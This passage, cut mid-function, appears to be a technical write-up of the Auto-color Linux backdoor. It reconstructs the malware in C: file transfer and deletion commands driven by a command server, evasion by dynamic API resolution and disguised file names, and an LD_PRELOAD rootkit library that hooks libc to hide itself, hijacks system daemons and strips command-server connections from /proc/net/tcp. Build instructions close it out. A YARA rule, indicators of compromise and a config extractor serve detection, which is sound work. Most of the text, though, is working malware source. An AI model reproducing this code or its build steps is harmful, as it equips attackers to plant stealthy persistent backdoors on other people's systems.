            if (read == 0) break;
            
            packet_header_t header = {0};
            header.encryption_key = generate_new_key();
            header.payload_size = read;
            
            send_encrypted_packet(socket_fd, &header, chunk, read);
            remaining -= read;
        }
        
        fclose(fp);
        return 0;
        
    } else if (strcmp(direction, "L2R") == 0) {
        // Upload: Receive file from C2
        FILE* fp = fopen(file_path, "wb");
        if (!fp) return ERROR_FILE_CREATE_FAILED;
        
        // Write received data
        if (data && data_size > 0) {
            fwrite(data, 1, data_size, fp);
        }
        
        fclose(fp);
        return 0;
    }
    
    return ERROR_INVALID_DIRECTION;
}
```

### 8.8 Commands 0x204, 0x205, 0x206 - File Operations

```c
/**
 * @brief Creates file or directory
 */
int cmd_file_create(const char* path, uint8_t is_directory) {
    if (is_directory) {
        return mkdir(path, 0755);
    } else {
        int fd = open(path, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            close(fd);
            return 0;
        }
        return -1;
    }
}

/**
 * @brief Renames file or directory
 */
int cmd_file_rename(const char* old_path, const char* new_path) {
    return rename(old_path, new_path);
}

/**
 * @brief Deletes file or directory
 */
int cmd_file_delete(const char* path, uint8_t is_directory) {
    if (is_directory) {
        return remove_directory(path);  // Recursive delete
    } else {
        return unlink(path);
    }
}
```

### 8.9 Commands 0x400, 0x401 - Configuration Management

```c
/**
 * @brief Reads and sends current configuration
 */
int cmd_config_read(int socket_fd) {
    char* config = get_current_config();
    
    packet_header_t header = {0};
    header.encryption_key = generate_new_key();
    
    if (config) {
        header.payload_size = strlen(config);
        send_encrypted_packet(socket_fd, &header, config, header.payload_size);
        free(config);
    } else {
        // Send default value
        const char* default_config = "DEFAULT";
        header.payload_size = strlen(default_config);
        send_encrypted_packet(socket_fd, &header, default_config, 
                             header.payload_size);
    }
    
    return 0;
}

/**
 * @brief Updates configuration
 */
int cmd_config_write(const uint8_t* new_config, size_t size, int socket_fd) {
    char* config_path = get_config_file_path();
    
    FILE* fp = fopen(config_path, "wb");
    if (!fp) {
        free(config_path);
        return ERROR_CONFIG_WRITE_FAILED;
    }
    
    fwrite(new_config, 1, size, fp);
    fclose(fp);
    
    // Set global flag
    g_config_updated = 1;
    
    // Send response with new path
    packet_header_t header = {0};
    header.encryption_key = generate_new_key();
    header.payload_size = strlen(config_path);
    send_encrypted_packet(socket_fd, &header, config_path, header.payload_size);
    
    free(config_path);
    return 0;
}
```

---

## 9. Evasion Techniques

### 9.1 Dynamic API Resolution

```c
/**
 * @brief Resolves function addresses at runtime to avoid static detection
 * @param library Library name (e.g., "libc.so.6")
 * @param function Function name
 * @return Function pointer, NULL on failure
 */
void* resolve_api(const char* library, const char* function) {
    void* handle = dlopen(library, RTLD_LAZY);
    if (!handle) return NULL;
    
    void* func = dlsym(handle, function);
    // Note: Do not dlclose - keep handle for future use
    
    return func;
}

// Example usage
typedef int (*fork_t)(void);
typedef int (*setsid_t)(void);
typedef int (*execv_t)(const char*, char*const[]);

fork_t p_fork = (fork_t)resolve_api("libc.so.6", "fork");
setsid_t p_setsid = (setsid_t)resolve_api("libc.so.6", "setsid");
execv_t p_execv = (execv_t)resolve_api("libc.so.6", "execv");
```

### 9.2 Benign File Naming

```c
// Disguise names used by malware
#define INSTALL_DIR        "/var/log/cross"      // Mixes with system logs
#define MALWARE_NAME       "auto-color"          // Appears as utility
#define LIBRARY_NAME       "libcext.so.2"        // Mimics legitimate libcext.so.0
#define PRELOAD_REDIRECT   "/etc/ld.so.preload.xxx"  // Redirect target
#define LOCK_FILE          "/tmp/.lock_%d"       // Hidden lock file
#define CONFIG_PREFIX      "config-err-"         // Looks like error log
#define ALTERNATIVE_NAMES  {"door", "egg", "log"} // Backup names
```

### 9.3 Green Mode (Non-Root Evasion)

```c
/**
 * @brief Alternative execution path for non-root users
 * Operates with reduced capabilities to avoid triggering root-level detection
 */
void green_mode() {
    // Use /tmp instead of /var/log
    const char* base_path = "/tmp/cross";
    
    // Skip library injection (requires root)
    // Skip /etc/ld.so.preload modification
    // Skip system daemon hijacking
    
    // Still perform:
    // - Daemonization
    // - C2 connection
    // - Command execution (limited by user permissions)
}
```

---

## 10. Shared Library Module (libcext.so.2)

### 10.1 Library Structure

```c
// libcext.so.2 - Malicious preload library

#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <fcntl.h>

// Function pointer types
typedef int (*orig_stat_t)(const char*, struct stat*);
typedef int (*orig_unlink_t)(const char*);
typedef int (*orig_rename_t)(const char*, const char*);
typedef FILE* (*orig_fopen_t)(const char*, const char*);
typedef int (*orig_open_t)(const char*, int, ...);

// Target daemon list for persistence
static const char* TARGET_DAEMONS[] = {
    "/sbin/auditd", "/sbin/cron", "/sbin/crond",
    "/sbin/acpid", "/sbin/atd",
    "/usr/sbin/auditd", "/usr/sbin/cron", "/usr/sbin/crond",
    "/usr/sbin/acpid", "/usr/sbin/atd",
    NULL
};

// Shared memory for C2 IP tracking
static uint32_t* g_c2_ips = NULL;
static uint32_t* g_c2_ports = NULL;
static int g_c2_count = 0;
```

### 10.2 /etc/ld.so.preload Protection Hooks

```c
/**
 * @brief Hooked stat function - redirects /etc/ld.so.preload access
 */
int stat(const char* pathname, struct stat* statbuf) {
    orig_stat_t orig_stat = (orig_stat_t)dlsym(RTLD_NEXT, "stat");
    
    if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
        // Redirect to fake file
        return orig_stat("/etc/ld.so.preload.xxx", statbuf);
    }
    
    return orig_stat(pathname, statbuf);
}

/**
 * @brief Hooked unlink function - prevents deletion of preload file
 */
int unlink(const char* pathname) {
    orig_unlink_t orig_unlink = (orig_unlink_t)dlsym(RTLD_NEXT, "unlink");
    
    if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
        errno = ENOENT;  // Pretend file doesn't exist
        return -1;
    }
    
    // Allow deletion of the redirect target
    return orig_unlink(pathname);
}

/**
 * @brief Hooked rename function - prevents renaming preload file
 */
int rename(const char* oldpath, const char* newpath) {
    orig_rename_t orig_rename = (orig_rename_t)dlsym(RTLD_NEXT, "rename");
    
    if (strcmp(oldpath, "/etc/ld.so.preload") == 0) {
        errno = EACCES;
        return -1;
    }
    
    return orig_rename(oldpath, newpath);
}

/**
 * @brief Hooked fopen function - prevents reading real preload
 */
FILE* fopen(const char* pathname, const char* mode) {
    orig_fopen_t orig_fopen = (orig_fopen_t)dlsym(RTLD_NEXT, "fopen");
    
    if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
        return orig_fopen("/etc/ld.so.preload.xxx", mode);
    }
    
    return orig_fopen(pathname, mode);
}

// Similar hooks for: chmod, fchmodat, lstat, fstat, fstatat, statx,
//                    _lxstat, access, faccessat, realpath, getattr,
//                    open, openat, read, pread, opendir, readdir, scandir
```

### 10.3 Persistence via Daemon Hijacking

```c
/**
 * @brief Constructor function - called when library is loaded
 * Checks if calling process is a target daemon and hijacks it
 */
__attribute__((constructor))
void lib_init() {
    char exe_path[256];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
    if (len <= 0) return;
    exe_path[len] = '\0';
    
    // Check if current process is a target daemon
    for (int i = 0; TARGET_DAEMONS[i] != NULL; i++) {
        if (strcmp(exe_path, TARGET_DAEMONS[i]) == 0) {
            hijack_process();
            break;
        }
    }
    
    // Initialize shared memory for C2 IP tracking
    init_shared_memory();
}

/**
 * @brief Hijacks daemon process to run malware
 */
void hijack_process() {
    pid_t pid = fork();
    if (pid < 0) return;
    
    if (pid == 0) {
        // Child: Execute malware
        const char* malware_path = "/var/log/cross/auto-color";
        char* argv[] = {"-flush", "-color", NULL};
        execl(malware_path, malware_path, "-flush", "-color", NULL);
        exit(1);  // Only if execl fails
    }
    
    // Parent: Exit to allow daemon to continue normally
    // (actual daemon was already running, we just spawned malware)
}
```

### 10.4 Network Activity Hiding

```c
/**
 * @brief Hooked open function - intercepts /proc/net/tcp reads
 */
int open(const char* pathname, int flags, ...) {
    orig_open_t orig_open = (orig_open_t)dlsym(RTLD_NEXT, "open");
    
    if (strcmp(pathname, "/proc/net/tcp") == 0) {
        // Return file descriptor for cleaned version
        return create_filtered_tcp_file();
    }
    
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    
    return orig_open(pathname, flags, mode);
}

/**
 * @brief Creates filtered version of /proc/net/tcp without C2 connections
 */
int create_filtered_tcp_file() {
    // Read original file
    orig_open_t orig_open = (orig_open_t)dlsym(RTLD_NEXT, "open");
    int orig_fd = orig_open("/proc/net/tcp", O_RDONLY, 0);
    if (orig_fd < 0) return orig_fd;
    
    // Create temp file for filtered output
    int temp_fd = orig_open("/tmp/17EF88CF", O_CREAT | O_WRONLY | O_TRUNC, 
                           0644);
    if (temp_fd < 0) {
        close(orig_fd);
        return orig_fd;  // Fallback to original
    }
    
    char line[256];
    int header_written = 0;
    
    while (read(orig_fd, line, sizeof(line)) > 0) {
        // Always write header
        if (!header_written) {
            write(temp_fd, line, strlen(line));
            header_written = 1;
            continue;
        }
        
        // Parse connection entry
        uint32_t local_ip, local_port, remote_ip, remote_port;
        if (parse_tcp_entry(line, &local_ip, &local_port, 
                           &remote_ip, &remote_port)) {
            // Check if this is a C2 connection
            if (!is_c2_connection(remote_ip, remote_port)) {
                write(temp_fd, line, strlen(line));
            }
        }
    }
    
    close(orig_fd);
    lseek(temp_fd, 0, SEEK_SET);
    
    return temp_fd;
}

/**
 * @brief Checks if IP:port matches C2 server
 */
int is_c2_connection(uint32_t ip, uint32_t port) {
    if (!g_c2_ips || g_c2_count == 0) return 0;
    
    for (int i = 0; i < g_c2_count; i++) {
        if (g_c2_ips[i] == ip && g_c2_ports[i] == port) {
            return 1;
        }
    }
    
    return 0;
}

/**
 * @brief Initializes shared memory for C2 IP tracking
 */
void init_shared_memory() {
    key_t key = ftok("/var/log/cross", 'A');
    int shmid = shmget(key, 4096, 0666);
    if (shmid < 0) return;
    
    void* shm = shmat(shmid, NULL, SHM_RDONLY);
    if (shm == (void*)-1) return;
    
    // Parse shared memory structure
    uint32_t* data = (uint32_t*)shm;
    g_c2_count = data[0];
    g_c2_ips = &data[1];
    g_c2_ports = &data[1 + g_c2_count];
}
```

---

## 11. Detection Signatures

### 11.1 YARA Rule

```yara
rule detect_Auto_Color {
    meta:
        description = "Detects Auto-color malware family"
        author = "Mohamed Ezzat (@ZW01f)"
        hash1 = "815b74947d3a78a1b7d2aece43596ddc0ffc264e26092f1f9b6409c62e1437d6"
        hash2 = "270fc72074c697ba5921f7b61a6128b968ca6ccbf8906645e796cfc3072d4c43"

    strings:
        $elf = "\x7fELF" nocase
        $s1 = "/var/log/cross" ascii
        $s2 = "/tmp/cross" ascii
        $s3 = "/door-%d.log" ascii
        $s4 = "/etc/ld.so.preload.xxx" ascii
        $s5 = "%s/auto-color" ascii wide
        $s6 = "%s memory dump %d bytes..." wide ascii

    condition:
        (filesize < 300KB) and ($elf at 0) and (5 of ($s*))
}
```

### 11.2 Indicators of Compromise (IOCs)

#### File System
| Indicator | Type | Description |
|-----------|------|-------------|
| `/var/log/cross/` | Directory | Malware installation directory |
| `/var/log/cross/auto-color` | File | Main malware binary |
| `/var/log/cross/config-err-*` | File | Encrypted configuration |
| `/lib/libcext.so.2` | File | Malicious shared library |
| `/etc/ld.so.preload` | File | Modified to load libcext.so.2 |
| `/etc/ld.so.preload.xxx` | File | Decoy file |
| `/tmp/17EF88CF` | File | Filtered /proc/net/tcp |
| `/tmp/.lock_*` | File | Instance lock files |
| `/tmp/cross/` | Directory | Non-root installation |

#### Network
| Indicator | Type | Description |
|-----------|------|-------------|
| TCP connections to unknown IPs | Network | C2 communication |
| Unusual outbound traffic | Network | Data exfiltration |
| Connections to non-standard ports | Network | Reverse shell/proxy |

#### Process
| Indicator | Type | Description |
|-----------|------|-------------|
| `auto-color` process | Process | Malware main process |
| Daemons with unexpected children | Process | Hijacked persistence |
| `/bin/bash -i` from unusual parent | Process | Reverse shell |

#### Shared Memory
| Indicator | Type | Description |
|-----------|------|-------------|
| Key from `/var/log/cross` | IPC | C2 IP tracking segment |

### 11.3 Detection Scripts

#### Python Configuration Extractor
```python
#!/usr/bin/env python3
from elftools.elf.elffile import ELFFile
import re

def extract_data_section(filename):
    with open(filename, "rb") as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            if section.name == ".data":
                return section.data()
    return None

def custom_crypto_algo(key, data):
    length = len(data)
    decrypted = bytearray(length)
    for i in range(length):
        key = (1023 * key - 0x70E52827) & 0xFFFFFFFF
        decrypted[i] = ((data[i] - (key >> 19)) ^ (key >> 11)) - (key >> 3) & 0xFF
    return decrypted

def extract_c2_urls(text):
    pattern = r'TCP://[a-zA-Z0-9.-]+:\d+'
    return re.findall(pattern, text, re.IGNORECASE)

def main():
    file_path = input("Enter the file path: ")
    data_section = extract_data_section(file_path)
    
    enc_data_offset = 0x24
    size_offset = 0x20
    
    size = int.from_bytes(data_section[size_offset:enc_data_offset], byteorder='big')
    enc_config = data_section[enc_data_offset:enc_data_offset + size]
    key = int.from_bytes(enc_config[-4:], "big")
    
    decrypted_data = custom_crypto_algo(key, enc_config).decode("utf-8", errors="ignore")
    print("Decrypted config:", decrypted_data)
    
    extracted_url = extract_c2_urls(decrypted_data)
    if extracted_url:
        print("Extracted C2 URLs:")
        for address in extracted_url:
            print(address)

if __name__ == '__main__':
    main()
```

---

## Appendix A: Complete Command Dispatch Table

| ID | Handler Function | Input | Output | Privileges |
|----|------------------|-------|--------|------------|
| 0x1 | `cmd_system_info()` | None | System info struct | User |
| 0xF | `cmd_self_destruct()` | None | None (terminates) | Root |
| 0x100 | `cmd_reverse_shell()` | None | Interactive shell | User |
| 0x201 | `cmd_dir_list()` | Directory path | File entries array | User |
| 0x202 | `cmd_file_transfer()` | Direction, path, data | File data | User |
| 0x204 | `cmd_file_create()` | Path, is_dir | Status | User |
| 0x205 | `cmd_file_rename()` | Old path, new path | Status | User |
| 0x206 | `cmd_file_delete()` | Path, is_dir | Status | User |
| 0x300 | `cmd_proxy()` | Target IP:port | Relay data | User |
| 0x400 | `cmd_config_read()` | None | Config data | User |
| 0x401 | `cmd_config_write()` | New config | Config path | User |

---

## Appendix B: Error Codes

| Code | Definition | Description |
|------|------------|-------------|
| 0 | `SUCCESS` | Operation completed successfully |
| 1 | `ERROR_GENERIC` | Generic error |
| 2 | `ERROR_PIPE_FAILED` | Pipe creation failed |
| 3 | `ERROR_FORK_FAILED` | Fork failed |
| 4 | `ERROR_CONNECT_FAILED` | Connection failed |
| 5 | `ERROR_ACCEPT_FAILED` | Accept failed |
| 6 | `ERROR_OPENDIR_FAILED` | Directory open failed |
| 7 | `ERROR_FILE_OPEN_FAILED` | File open failed |
| 8 | `ERROR_FILE_CREATE_FAILED` | File creation failed |
| 9 | `ERROR_INVALID_DIRECTION` | Invalid transfer direction |
| 10 | `ERROR_CONFIG_WRITE_FAILED` | Configuration write failed |
| 11 | `ERROR_INSTALL_FAILED` | Installation failed |
| 100 | `ERROR_SEND_FAILED` | Send operation failed |
| 101 | `ERROR_RECV_FAILED` | Receive operation failed |
| 104 | `SELF_DESTRUCT` | Self-destruct executed |

---

## Appendix C: Build Instructions

### Compiler Flags
```bash
gcc -o auto-color auto-color.c \
    -ldl -lpthread \
    -static \
    -O2 \
    -fno-stack-protector \
    -Wl,--strip-all
```

### Shared Library Build
```bash
gcc -shared -fPIC -o libcext.so.2 libcext.c \
    -ldl \
    -O2 \
    -Wl,--strip-all
```

### Embedding Library in Binary
```bash
# Convert library to C array
xxd -i libcext.so.2 > lib_data.h

# Include in main binary
gcc -include lib_data.h -o auto-color auto-color.c ...
```

---


